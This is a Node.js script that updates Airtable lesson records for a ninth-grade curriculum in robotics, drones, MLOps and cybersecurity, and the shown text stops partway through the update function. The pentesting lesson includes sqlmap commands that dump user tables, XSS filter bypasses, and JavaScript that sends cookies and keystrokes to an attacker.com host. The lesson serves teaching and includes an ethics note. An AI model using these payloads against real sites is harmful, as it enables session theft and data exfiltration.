const fs = require('fs');

let AIRTABLE_API_KEY = '';
let AIRTABLE_BASE_ID = '';

try {
  const envContent = fs.readFileSync('.env.local', 'utf8');
  envContent.split('\n').forEach(line => {
    if (line.startsWith('AIRTABLE_API_KEY=')) AIRTABLE_API_KEY = line.split('=')[1].trim();
    if (line.startsWith('AIRTABLE_BASE_ID=')) AIRTABLE_BASE_ID = line.split('=')[1].trim();
  });
} catch (e) {
  console.log('Error leyendo .env.local');
  process.exit(1);
}

// Contenido mejorado para TODOS los módulos de noveno-egb
const allUpdates = [
  // ========== ROBÓTICA INDUSTRIAL ==========
  {
    filter: { levelId: 'noveno-egb', title: 'Robots industriales', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=P7fi4hP_y80',
      content: `# Robots Industriales

## 🎯 Objetivos de Aprendizaje
- Conocer los tipos de robots industriales
- Identificar aplicaciones en manufactura
- Comprender las marcas líderes: FANUC, ABB, KUKA

## 📹 Video Tutorial
Descubre cómo funcionan los robots en las fábricas modernas.

## 📚 Contenido Teórico

### Tipos de Robots Industriales
| Tipo | Aplicación | Ejemplo |
|------|------------|---------|
| Articulado (6 ejes) | Soldadura, pintura | FANUC M-20iA |
| SCARA | Ensamblaje electrónico | Epson T6 |
| Delta | Pick & place rápido | ABB IRB 360 |
| Cartesiano | CNC, impresión 3D | Gantry systems |

### Componentes de un Robot Industrial
1. **Base**: Fijación al suelo
2. **Brazos**: Eslabones articulados
3. **Muñeca**: Orientación del efector
4. **Efector final**: Pinza, soldador, etc.
5. **Controlador**: Cerebro del robot
6. **Teach Pendant**: Programación manual

### Marcas Líderes Mundiales
- **FANUC** (Japón): Líder en automotriz
- **ABB** (Suiza): Versatilidad industrial
- **KUKA** (Alemania): Precisión europea
- **Yaskawa** (Japón): Motoman series
- **Universal Robots** (Dinamarca): Cobots

## 💻 Actividad Práctica
1. Investiga qué robots usa Tesla en su fábrica
2. Compara especificaciones de FANUC vs KUKA
3. Dibuja el espacio de trabajo de un robot articulado

## 📖 Recursos
- [FANUC Academy](https://www.fanuc.eu/es/es/robots)
- [ABB Robotics](https://new.abb.com/products/robotics)
- [Simulador RoboDK](https://robodk.com/)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Programación de robots industriales', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=SBYcqjJPl5o',
      content: `# Programación de Robots Industriales

## 🎯 Objetivos
- Conocer lenguajes de programación de robots
- Entender el teach pendant
- Practicar con simuladores

## 📚 Contenido

### Lenguajes Propietarios
Cada fabricante tiene su propio lenguaje:

**RAPID (ABB)**
\`\`\`
PROC main()
    MoveJ p1, v1000, z50, tool1;
    MoveL p2, v500, fine, tool1;
    WaitTime 1;
    Set do1;
ENDPROC
\`\`\`

**KRL (KUKA)**
\`\`\`
DEF main()
    PTP HOME
    LIN P1 VEL=2 m/s
    CIRC P2, P3
    WAIT SEC 1
    $OUT[1] = TRUE
END
\`\`\`

**KAREL (FANUC)**
\`\`\`
PROGRAM ejemplo
BEGIN
    J P[1] 100% FINE
    L P[2] 500mm/sec FINE
    WAIT 1.0(sec)
    DO[1] = ON
END ejemplo
\`\`\`

### Tipos de Movimiento
- **PTP/Joint**: Movimiento rápido, trayectoria no lineal
- **LIN/Linear**: Línea recta, más lento
- **CIRC/Circular**: Arcos y círculos

### Teach Pendant
Dispositivo portátil para:
- Mover el robot manualmente
- Grabar posiciones
- Ejecutar programas
- Diagnóstico de errores

## 💻 Práctica con Simulador
Usa RoboDK (gratuito para estudiantes):
1. Descarga: robodk.com
2. Selecciona un robot KUKA o ABB
3. Programa una trayectoria simple
4. Simula y exporta el código

## 📖 Recursos
- [RoboDK Tutorial](https://robodk.com/doc/en/Getting-Started.html)
- [ABB RobotStudio](https://new.abb.com/products/robotics/robotstudio)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Cobots: Robots colaborativos', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=hRuBpIBr7Ek',
      content: `# Cobots: Robots Colaborativos

## 🎯 Objetivos
- Diferenciar cobots de robots tradicionales
- Conocer características de seguridad
- Entender aplicaciones colaborativas

## 📚 Contenido

### ¿Qué es un Cobot?
Un cobot (robot colaborativo) trabaja **junto a humanos** sin necesidad de jaulas de seguridad.

### Diferencias Clave
| Característica | Robot Industrial | Cobot |
|----------------|------------------|-------|
| Velocidad | Alta (2+ m/s) | Limitada (<1.5 m/s) |
| Fuerza | Alta (cientos N) | Limitada (<150N) |
| Seguridad | Jaula requerida | Sin jaula |
| Programación | Compleja | Intuitiva |
| Costo | $50,000-500,000 | $20,000-50,000 |
| Instalación | Semanas | Horas |

### Características de Seguridad
1. **Sensores de fuerza**: Detectan colisiones
2. **Bordes redondeados**: Sin puntos de pellizco
3. **Velocidad limitada**: Se detiene si detecta humano
4. **Modo colaborativo**: Reduce fuerza cerca de personas

### Marcas Líderes en Cobots
- **Universal Robots**: UR3, UR5, UR10, UR16
- **FANUC**: Serie CR (Collaborative Robot)
- **ABB**: YuMi, GoFa, SWIFTI
- **Doosan**: Serie M y H

### Aplicaciones
- Carga/descarga de máquinas CNC
- Empaque y paletizado
- Inspección de calidad
- Atornillado y ensamblaje
- Soldadura ligera

## 💻 Actividad
1. Investiga el precio de un UR5e
2. Lista 3 tareas en tu escuela que podría hacer un cobot
3. Diseña una estación de trabajo colaborativa

## 📖 Recursos
- [Universal Robots Academy](https://academy.universal-robots.com/) (GRATIS)
- [Certificación UR](https://www.universal-robots.com/academy/)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Proyecto: Celda de manufactura', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=_DmPvLzxGIU',
      content: `# Proyecto: Celda de Manufactura Automatizada

## 🎯 Objetivo
Diseñar una celda de manufactura completa con robot, conveyor y sensores.

## 📋 Componentes del Proyecto
- 1 Robot industrial (simulado)
- 1 Banda transportadora
- Sensores de presencia
- PLC para control
- Interfaz HMI

## 📚 Diseño de la Celda

### Layout Típico
\`\`\`
    [Alimentador]
         |
    [Conveyor] → [Sensor] → [Robot] → [Salida]
         |                      |
    [Rechazo]              [Herramienta]
\`\`\`

### Secuencia de Operación
1. Pieza llega por conveyor
2. Sensor detecta presencia
3. Conveyor se detiene
4. Robot toma pieza
5. Robot realiza operación
6. Robot coloca en salida
7. Conveyor continúa

### Código PLC (Ladder Logic)
\`\`\`
|--[Sensor]--[/Robot_Busy]--( Conveyor_Stop )--|
|--[Conveyor_Stop]--[Timer 0.5s]--( Robot_Start )--|
|--[Robot_Done]--( Conveyor_Run )--|
\`\`\`

## 💻 Implementación en Simulador

### Opción 1: Factory I/O
Software de simulación de fábricas:
- Conecta con PLC real o simulado
- Escenas prediseñadas
- Física realista

### Opción 2: RoboDK
- Importa modelo de robot
- Crea estación de trabajo
- Programa trayectorias
- Simula ciclo completo

## 🏆 Criterios de Evaluación
| Criterio | Puntos |
|----------|--------|
| Diseño del layout | 20% |
| Secuencia lógica | 25% |
| Programación robot | 25% |
| Integración sensores | 15% |
| Documentación | 15% |

## 📖 Recursos
- [Factory I/O](https://factoryio.com/)
- [RoboDK](https://robodk.com/)
- [Codesys PLC](https://www.codesys.com/)`
    }
  },
  // ========== DRONES Y VEHÍCULOS AUTÓNOMOS ==========
  {
    filter: { levelId: 'noveno-egb', title: 'Principios de vuelo', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=N_XneaFmOmU',
      content: `# Principios de Vuelo de Drones

## 🎯 Objetivos
- Comprender aerodinámica básica
- Conocer tipos de multirotores
- Entender el control de vuelo

## 📚 Contenido

### Fuerzas en Vuelo
| Fuerza | Dirección | Generada por |
|--------|-----------|--------------|
| Thrust (Empuje) | Arriba | Hélices |
| Weight (Peso) | Abajo | Gravedad |
| Drag (Arrastre) | Opuesto al movimiento | Fricción aire |

### Tipos de Multirotores
- **Tricóptero**: 3 motores, mecánicamente complejo
- **Cuadricóptero**: 4 motores, más común
- **Hexacóptero**: 6 motores, redundancia
- **Octocóptero**: 8 motores, cargas pesadas

### Control de Movimiento (Cuadricóptero)
\`\`\`
    [M1 CW]     [M2 CCW]
         \\     /
          \\   /
           [X]
          /   \\
         /     \\
    [M3 CCW]   [M4 CW]
\`\`\`

**Movimientos:**
- **Throttle**: Todos los motores igual → sube/baja
- **Pitch**: M1+M2 vs M3+M4 → adelante/atrás
- **Roll**: M1+M3 vs M2+M4 → izquierda/derecha
- **Yaw**: CW vs CCW → giro sobre eje

### Controlador de Vuelo
El "cerebro" del drone:
- **IMU**: Giroscopio + Acelerómetro
- **Barómetro**: Altitud
- **GPS**: Posición
- **Magnetómetro**: Orientación

Ejemplos: Pixhawk, Betaflight FC, DJI Naza

## 💻 Actividad
1. Calcula el thrust necesario para un drone de 1kg
2. Dibuja las fuerzas en un drone en hover
3. Investiga qué FC usa el DJI Mini

## 📖 Recursos
- [Betaflight Configurator](https://github.com/betaflight/betaflight-configurator)
- [ArduPilot](https://ardupilot.org/)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Ardupilot y PX4', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=JvRhUfnLv5A',
      content: `# ArduPilot y PX4: Firmware Open Source

## 🎯 Objetivos
- Conocer ArduPilot y PX4
- Configurar modos de vuelo
- Planificar misiones autónomas

## 📚 Contenido

### ArduPilot vs PX4
| Característica | ArduPilot | PX4 |
|----------------|-----------|-----|
| Licencia | GPLv3 | BSD |
| Vehículos | Copter, Plane, Rover, Sub | Multi, Fixed, VTOL |
| Ground Station | Mission Planner | QGroundControl |
| Comunidad | Más grande | Más comercial |
| Dificultad | Media | Media-Alta |

### Modos de Vuelo ArduPilot
- **Stabilize**: Control manual estabilizado
- **Alt Hold**: Mantiene altitud
- **Loiter**: Mantiene posición GPS
- **Auto**: Sigue waypoints
- **RTL**: Return to Launch
- **Land**: Aterrizaje automático

### Mission Planner
Software para planificar vuelos:
\`\`\`
1. Conectar drone (USB o telemetría)
2. Calibrar sensores
3. Configurar parámetros
4. Crear misión con waypoints
5. Subir misión al drone
6. Ejecutar en modo AUTO
\`\`\`

### Ejemplo de Misión
\`\`\`
WP1: Takeoff 10m
WP2: Fly to GPS(lat, lon) at 15m
WP3: Loiter 30 seconds
WP4: Fly to GPS(lat2, lon2)
WP5: Land
\`\`\`

### Geofencing
Límites virtuales de seguridad:
- Altitud máxima
- Radio máximo desde home
- Zonas prohibidas (aeropuertos)

## 💻 Práctica
1. Descarga Mission Planner
2. Usa el simulador SITL integrado
3. Crea una misión de 5 waypoints
4. Simula el vuelo completo

## 📖 Recursos
- [ArduPilot Docs](https://ardupilot.org/copter/)
- [Mission Planner](https://ardupilot.org/planner/)
- [SITL Simulator](https://ardupilot.org/dev/docs/sitl-simulator-software-in-the-loop.html)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Visión para navegación', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=SBYcqjJPl5o',
      content: `# Visión por Computadora para Navegación

## 🎯 Objetivos
- Entender optical flow y visual odometry
- Conocer SLAM para drones
- Implementar navegación sin GPS

## 📚 Contenido

### ¿Por qué Visión?
GPS tiene limitaciones:
- No funciona en interiores
- Precisión de metros (no cm)
- Puede ser interferido

La visión permite navegación precisa en cualquier lugar.

### Optical Flow
Detecta movimiento analizando cambios entre frames:
\`\`\`python
import cv2

# Calcular optical flow
flow = cv2.calcOpticalFlowFarneback(
    prev_gray, curr_gray, None,
    0.5, 3, 15, 3, 5, 1.2, 0
)

# Velocidad estimada
vx = np.mean(flow[:,:,0])
vy = np.mean(flow[:,:,1])
\`\`\`

### Visual Odometry (VO)
Estima posición usando características visuales:
1. Detectar features (SIFT, ORB)
2. Hacer matching entre frames
3. Calcular transformación
4. Acumular movimiento

### SLAM (Simultaneous Localization and Mapping)
Crea mapa mientras se localiza:
- **ORB-SLAM**: Basado en features
- **LSD-SLAM**: Basado en líneas
- **RTAB-Map**: RGB-D (con profundidad)

### Sensores de Profundidad
- **Stereo cameras**: Dos cámaras
- **ToF (Time of Flight)**: Mide tiempo de luz
- **LiDAR**: Láser rotativo
- **Intel RealSense**: Combinación

## 💻 Práctica con Python
\`\`\`python
import cv2
import numpy as np

cap = cv2.VideoCapture(0)
ret, prev_frame = cap.read()
prev_gray = cv2.cvtColor(prev_frame, cv2.COLOR_BGR2GRAY)

while True:
    ret, frame = cap.read()
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    
    # Optical flow
    flow = cv2.calcOpticalFlowFarneback(
        prev_gray, gray, None, 0.5, 3, 15, 3, 5, 1.2, 0
    )
    
    # Visualizar
    magnitude = np.sqrt(flow[:,:,0]**2 + flow[:,:,1]**2)
    cv2.imshow('Flow', magnitude / magnitude.max())
    
    prev_gray = gray
    if cv2.waitKey(1) == 27: break
\`\`\`

## 📖 Recursos
- [OpenCV Optical Flow](https://docs.opencv.org/4.x/d4/dee/tutorial_optical_flow.html)
- [ORB-SLAM3](https://github.com/UZ-SLAMLab/ORB_SLAM3)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Proyecto: Drone autónomo', programId: 'robotica' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=PLkqTZqyoaE',
      content: `# Proyecto: Drone Autónomo

## 🎯 Objetivo
Programar un drone simulado para misión completamente autónoma.

## 📋 Requisitos de la Misión
1. Despegue automático a 10m
2. Volar a 3 waypoints
3. Realizar acción en cada punto
4. Regresar y aterrizar
5. Sin intervención humana

## 📚 Implementación

### Opción 1: DroneKit + SITL
\`\`\`python
from dronekit import connect, VehicleMode, LocationGlobalRelative
import time

# Conectar al simulador
vehicle = connect('127.0.0.1:14550', wait_ready=True)

def arm_and_takeoff(target_altitude):
    print("Armando motores...")
    vehicle.mode = VehicleMode("GUIDED")
    vehicle.armed = True
    
    while not vehicle.armed:
        time.sleep(1)
    
    print("Despegando...")
    vehicle.simple_takeoff(target_altitude)
    
    while True:
        altitude = vehicle.location.global_relative_frame.alt
        if altitude >= target_altitude * 0.95:
            print("Altitud alcanzada")
            break
        time.sleep(1)

def goto(lat, lon, alt):
    point = LocationGlobalRelative(lat, lon, alt)
    vehicle.simple_goto(point)
    # Esperar llegada...

# MISIÓN
arm_and_takeoff(10)

waypoints = [
    (-35.363, 149.165, 15),
    (-35.362, 149.166, 15),
    (-35.361, 149.165, 15),
]

for wp in waypoints:
    print(f"Volando a {wp}")
    goto(*wp)
    time.sleep(5)  # Acción en waypoint

print("Regresando a casa...")
vehicle.mode = VehicleMode("RTL")
\`\`\`

### Opción 2: Mission Planner
1. Crear misión con waypoints
2. Agregar comandos DO_SET_SERVO
3. Configurar RTL al final
4. Simular en SITL

## 🏆 Evaluación
| Criterio | Puntos |
|----------|--------|
| Despegue correcto | 15% |
| Navegación waypoints | 30% |
| Acciones en puntos | 20% |
| RTL y aterrizaje | 20% |
| Código documentado | 15% |

## 💻 Configuración del Simulador
\`\`\`bash
# Instalar ArduPilot SITL
git clone https://github.com/ArduPilot/ardupilot.git
cd ardupilot
./Tools/environment_install/install-prereqs-ubuntu.sh

# Ejecutar simulador
cd ArduCopter
sim_vehicle.py -w
\`\`\`

## 📖 Recursos
- [DroneKit Python](https://dronekit-python.readthedocs.io/)
- [ArduPilot SITL](https://ardupilot.org/dev/docs/sitl-simulator-software-in-the-loop.html)`
    }
  },
  // ========== IA - MLOps ==========
  {
    filter: { levelId: 'noveno-egb', title: 'Ciclo de vida de ML', programId: 'ia' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=NgWujOrCZFo',
      content: `# Ciclo de Vida de Machine Learning (MLOps)

## 🎯 Objetivos
- Entender las fases de un proyecto ML
- Conocer herramientas de MLOps
- Implementar buenas prácticas

## 📚 Contenido

### Fases del Ciclo de Vida ML
\`\`\`
[Datos] → [Entrenamiento] → [Evaluación] → [Deployment] → [Monitoreo]
   ↑                                                            |
   └────────────────── Reentrenamiento ←────────────────────────┘
\`\`\`

### 1. Recolección de Datos
- Fuentes: APIs, bases de datos, scraping
- Limpieza: valores faltantes, outliers
- Etiquetado: manual o automático

### 2. Entrenamiento
- Feature engineering
- Selección de modelo
- Hyperparameter tuning
- Validación cruzada

### 3. Evaluación
- Métricas: accuracy, precision, recall, F1
- Matriz de confusión
- Curvas ROC/AUC

### 4. Deployment
- API REST (Flask, FastAPI)
- Contenedores (Docker)
- Serverless (AWS Lambda)
- Edge (TensorFlow Lite)

### 5. Monitoreo
- Data drift: ¿cambiaron los datos?
- Model drift: ¿bajó el rendimiento?
- Alertas automáticas

### Herramientas MLOps
| Fase | Herramientas |
|------|--------------|
| Datos | DVC, Great Expectations |
| Experimentos | MLflow, Weights & Biases |
| Pipelines | Kubeflow, Airflow |
| Deployment | BentoML, Seldon |
| Monitoreo | Evidently, WhyLabs |

## 💻 Ejemplo con MLflow
\`\`\`python
import mlflow
from sklearn.ensemble import RandomForestClassifier

mlflow.set_experiment("mi_experimento")

with mlflow.start_run():
    # Entrenar modelo
    model = RandomForestClassifier(n_estimators=100)
    model.fit(X_train, y_train)
    
    # Evaluar
    accuracy = model.score(X_test, y_test)
    
    # Loggear
    mlflow.log_param("n_estimators", 100)
    mlflow.log_metric("accuracy", accuracy)
    mlflow.sklearn.log_model(model, "model")
\`\`\`

## 📖 Recursos
- [MLflow](https://mlflow.org/)
- [Made With ML](https://madewithml.com/)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Versionado de datos y modelos', programId: 'ia' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=kLKBcPonMYw',
      content: `# Versionado de Datos y Modelos

## 🎯 Objetivos
- Versionar datasets con DVC
- Trackear experimentos con MLflow
- Garantizar reproducibilidad

## 📚 Contenido

### ¿Por qué Versionar?
- **Reproducibilidad**: Recrear resultados exactos
- **Colaboración**: Equipo sincronizado
- **Auditoría**: Historial de cambios
- **Rollback**: Volver a versiones anteriores

### DVC (Data Version Control)
Git para datos grandes:
\`\`\`bash
# Inicializar
dvc init

# Agregar dataset
dvc add data/dataset.csv

# Guardar en remoto (S3, GCS, etc)
dvc remote add -d storage s3://mi-bucket/dvc
dvc push

# Versionar con git
git add data/dataset.csv.dvc .gitignore
git commit -m "Add dataset v1"
\`\`\`

### Estructura de Proyecto
\`\`\`
proyecto/
├── data/
│   ├── raw/           # Datos originales
│   ├── processed/     # Datos procesados
│   └── dataset.csv.dvc
├── models/
│   └── model.pkl.dvc
├── src/
│   ├── train.py
│   └── evaluate.py
├── dvc.yaml           # Pipeline
└── params.yaml        # Parámetros
\`\`\`

### MLflow para Experimentos
\`\`\`python
import mlflow

# Configurar tracking
mlflow.set_tracking_uri("http://localhost:5000")

# Loggear experimento
with mlflow.start_run(run_name="exp_v1"):
    mlflow.log_params({
        "learning_rate": 0.01,
        "epochs": 100,
        "batch_size": 32
    })
    
    mlflow.log_metrics({
        "train_loss": 0.15,
        "val_accuracy": 0.92
    })
    
    mlflow.log_artifact("model.pkl")
\`\`\`

### Pipeline DVC
\`\`\`yaml
# dvc.yaml
stages:
  prepare:
    cmd: python src/prepare.py
    deps:
      - data/raw
    outs:
      - data/processed
  
  train:
    cmd: python src/train.py
    deps:
      - data/processed
      - src/train.py
    params:
      - train.epochs
      - train.lr
    outs:
      - models/model.pkl
\`\`\`

## 💻 Práctica
1. Instala DVC: \`pip install dvc\`
2. Versiona un dataset pequeño
3. Crea un pipeline de 2 etapas

## 📖 Recursos
- [DVC Documentation](https://dvc.org/doc)
- [MLflow Tracking](https://mlflow.org/docs/latest/tracking.html)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Deployment de modelos', programId: 'ia' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=h5wLuVDr0oc',
      content: `# Deployment de Modelos ML

## 🎯 Objetivos
- Servir modelos como APIs
- Containerizar con Docker
- Desplegar en la nube

## 📚 Contenido

### Opciones de Deployment
| Método | Uso | Latencia |
|--------|-----|----------|
| REST API | Web apps | Media |
| gRPC | Microservicios | Baja |
| Batch | Procesamiento masivo | Alta |
| Edge | Dispositivos IoT | Muy baja |
| Serverless | Uso esporádico | Variable |

### API con FastAPI
\`\`\`python
from fastapi import FastAPI
from pydantic import BaseModel
import joblib

app = FastAPI()
model = joblib.load("model.pkl")

class PredictionInput(BaseModel):
    feature1: float
    feature2: float
    feature3: float

class PredictionOutput(BaseModel):
    prediction: int
    probability: float

@app.post("/predict", response_model=PredictionOutput)
def predict(input: PredictionInput):
    features = [[input.feature1, input.feature2, input.feature3]]
    prediction = model.predict(features)[0]
    probability = model.predict_proba(features)[0].max()
    
    return PredictionOutput(
        prediction=int(prediction),
        probability=float(probability)
    )

# Ejecutar: uvicorn main:app --reload
\`\`\`

### Dockerfile
\`\`\`dockerfile
FROM python:3.9-slim

WORKDIR /app

COPY requirements.txt .
RUN pip install -r requirements.txt

COPY model.pkl .
COPY main.py .

EXPOSE 8000
CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
\`\`\`

### Docker Compose
\`\`\`yaml
version: '3'
services:
  ml-api:
    build: .
    ports:
      - "8000:8000"
    environment:
      - MODEL_PATH=/app/model.pkl
    volumes:
      - ./models:/app/models
\`\`\`

### Despliegue en Cloud
**AWS:**
- EC2: Servidor tradicional
- Lambda: Serverless
- SageMaker: ML gestionado

**Google Cloud:**
- Cloud Run: Contenedores serverless
- Vertex AI: ML gestionado

**Azure:**
- Container Instances
- Azure ML

## 💻 Práctica
1. Crea una API con FastAPI
2. Containeriza con Docker
3. Despliega en Railway o Render (gratis)

## 📖 Recursos
- [FastAPI](https://fastapi.tiangolo.com/)
- [Docker para ML](https://docs.docker.com/)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Proyecto: Pipeline de ML', programId: 'ia' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=pxk1Fr33-L4',
      content: `# Proyecto: Pipeline Completo de ML

## 🎯 Objetivo
Crear un pipeline end-to-end: datos → entrenamiento → deployment.

## 📋 Requisitos
- Dataset: Clasificación de flores (Iris)
- Modelo: Random Forest
- API: FastAPI
- CI/CD: GitHub Actions

## 📚 Estructura del Proyecto
\`\`\`
ml-pipeline/
├── data/
│   └── iris.csv
├── src/
│   ├── train.py
│   ├── evaluate.py
│   └── api.py
├── models/
│   └── model.pkl
├── tests/
│   └── test_api.py
├── Dockerfile
├── requirements.txt
├── dvc.yaml
└── .github/workflows/
    └── ml-pipeline.yml
\`\`\`

## 💻 Implementación

### 1. train.py
\`\`\`python
import pandas as pd
from sklearn.ensemble import RandomForestClassifier
from sklearn.model_selection import train_test_split
import joblib
import mlflow

# Cargar datos
df = pd.read_csv("data/iris.csv")
X = df.drop("species", axis=1)
y = df["species"]

X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)

# Entrenar
with mlflow.start_run():
    model = RandomForestClassifier(n_estimators=100)
    model.fit(X_train, y_train)
    
    accuracy = model.score(X_test, y_test)
    mlflow.log_metric("accuracy", accuracy)
    
    joblib.dump(model, "models/model.pkl")
    mlflow.log_artifact("models/model.pkl")
    
print(f"Accuracy: {accuracy:.4f}")
\`\`\`

### 2. api.py
\`\`\`python
from fastapi import FastAPI
from pydantic import BaseModel
import joblib

app = FastAPI(title="Iris Classifier")
model = joblib.load("models/model.pkl")

class IrisInput(BaseModel):
    sepal_length: float
    sepal_width: float
    petal_length: float
    petal_width: float

@app.post("/predict")
def predict(iris: IrisInput):
    features = [[
        iris.sepal_length, iris.sepal_width,
        iris.petal_length, iris.petal_width
    ]]
    prediction = model.predict(features)[0]
    return {"species": prediction}
\`\`\`

### 3. GitHub Actions
\`\`\`yaml
# .github/workflows/ml-pipeline.yml
name: ML Pipeline

on: [push]

jobs:
  train-and-deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      
      - name: Setup Python
        uses: actions/setup-python@v2
        with:
          python-version: '3.9'
      
      - name: Install dependencies
        run: pip install -r requirements.txt
      
      - name: Train model
        run: python src/train.py
      
      - name: Run tests
        run: pytest tests/
      
      - name: Build Docker
        run: docker build -t ml-api .
\`\`\`

## 🏆 Evaluación
| Criterio | Puntos |
|----------|--------|
| Pipeline funcional | 30% |
| API documentada | 20% |
| Tests incluidos | 20% |
| CI/CD configurado | 20% |
| Documentación | 10% |

## 📖 Recursos
- [GitHub Actions](https://docs.github.com/en/actions)
- [MLflow Projects](https://mlflow.org/docs/latest/projects.html)`
    }
  },
  // ========== HACKING - Ciberseguridad ==========
  {
    filter: { levelId: 'noveno-egb', title: 'Seguridad en APIs', programId: 'hacking' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=t4-416mg6iU',
      content: `# Seguridad en APIs

## 🎯 Objetivos
- Identificar vulnerabilidades comunes en APIs
- Implementar autenticación segura
- Proteger endpoints

## 📚 Contenido

### OWASP API Security Top 10
1. **Broken Object Level Authorization**
2. **Broken Authentication**
3. **Excessive Data Exposure**
4. **Lack of Resources & Rate Limiting**
5. **Broken Function Level Authorization**
6. **Mass Assignment**
7. **Security Misconfiguration**
8. **Injection**
9. **Improper Assets Management**
10. **Insufficient Logging & Monitoring**

### Autenticación Segura
\`\`\`python
# JWT Authentication
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import OAuth2PasswordBearer
import jwt

SECRET_KEY = "tu-clave-secreta-muy-larga"
oauth2_scheme = OAuth2PasswordBearer(tokenUrl="token")

def verify_token(token: str = Depends(oauth2_scheme)):
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
        return payload
    except jwt.ExpiredSignatureError:
        raise HTTPException(status_code=401, detail="Token expirado")
    except jwt.InvalidTokenError:
        raise HTTPException(status_code=401, detail="Token inválido")

@app.get("/protected")
def protected_route(user: dict = Depends(verify_token)):
    return {"message": f"Hola {user['username']}"}
\`\`\`

### Rate Limiting
\`\`\`python
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@app.get("/api/data")
@limiter.limit("10/minute")
def get_data():
    return {"data": "sensitive info"}
\`\`\`

### Validación de Entrada
\`\`\`python
from pydantic import BaseModel, validator
import re

class UserInput(BaseModel):
    username: str
    email: str
    
    @validator('username')
    def username_alphanumeric(cls, v):
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Username must be alphanumeric')
        return v
    
    @validator('email')
    def email_valid(cls, v):
        if not re.match(r'^[\\w.-]+@[\\w.-]+\\.\\w+$', v):
            raise ValueError('Invalid email')
        return v
\`\`\`

## 💻 Práctica
1. Implementa JWT en una API
2. Agrega rate limiting
3. Valida todas las entradas

## 📖 Recursos
- [OWASP API Security](https://owasp.org/www-project-api-security/)
- [FastAPI Security](https://fastapi.tiangolo.com/tutorial/security/)`
    }
  },
  {
    filter: { levelId: 'noveno-egb', title: 'Pentesting web avanzado', programId: 'hacking' },
    updates: {
      videoUrl: 'https://www.youtube.com/watch?v=3Kq1MIfTWCE',
      content: `# Pentesting Web Avanzado

## 🎯 Objetivos
- Usar herramientas profesionales de pentesting
- Identificar vulnerabilidades avanzadas
- Documentar hallazgos

## 📚 Contenido

### Metodología de Pentesting
1. **Reconocimiento**: Información pública
2. **Escaneo**: Puertos, servicios
3. **Enumeración**: Usuarios, directorios
4. **Explotación**: Vulnerabilidades
5. **Post-explotación**: Persistencia
6. **Reporte**: Documentación

### Herramientas Esenciales
| Herramienta | Uso |
|-------------|-----|
| Burp Suite | Proxy e interceptor |
| OWASP ZAP | Scanner automático |
| Nmap | Escaneo de puertos |
| SQLMap | Inyección SQL |
| Nikto | Scanner web |
| Gobuster | Fuerza bruta directorios |

### Burp Suite - Interceptar Requests
\`\`\`
1. Configurar proxy en navegador (127.0.0.1:8080)
2. Activar Intercept en Burp
3. Navegar al sitio objetivo
4. Modificar requests en tiempo real
5. Enviar a Repeater para pruebas
\`\`\`

### SQL Injection Avanzada
\`\`\`bash
# SQLMap automático
sqlmap -u "http://target.com/page?id=1" --dbs

# Con cookie de sesión
sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123" --dbs

# Dump de tabla específica
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump
\`\`\`

### XSS Avanzado
\`\`\`javascript
// Bypass de filtros
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onpageshow=alert(1)>

// Robo de cookies
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>

// Keylogger
<script>
document.onkeypress=function(e){
  fetch('https://attacker.com/log?k='+e.key)
}
</script>
\`\`\`

## ⚠️ Ética
- Solo en sistemas con autorización
- Usa entornos de práctica (DVWA, HackTheBox)
- Reporta vulnerabilidades responsablemente

## 💻 Práctica
1. Instala DVWA localmente
2. Completa todos los niveles de SQL Injection
3. Documenta cada vulnerabilidad encontrada

## 📖 Recursos
- [PortSwigger Web Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)`
    }
  }
];

async function updateAll() {
  console.log(`Actualizando ${allUpdates.length} lecciones de noveno-egb...\n`);
  
  let updated = 0;
  let errors = 0;
  
  for (const update of allUpdates) {
    const { levelId, title, programId } = update.filter;
    
    const filterFormula = `AND({levelId}="${levelId}",{title}="${title}",{programId}="${programId}")`;
    const searchUrl = `https://api.airtable.com/v0/${AIRTABLE_BASE_ID}/lessons?filterByFormula=${encodeURIComponent(filterFormula)}`;
    
    try {
      const searchResp = await fetch(searchUrl, {
        headers: { 'Authorization': `Bearer ${AIRTABLE_API_KEY}` }
      });
      const searchData = await searchResp.json();
      
      if (searchData.records && searchData.records.length > 0) {
        const recordId = searchData.records[0].id;
        
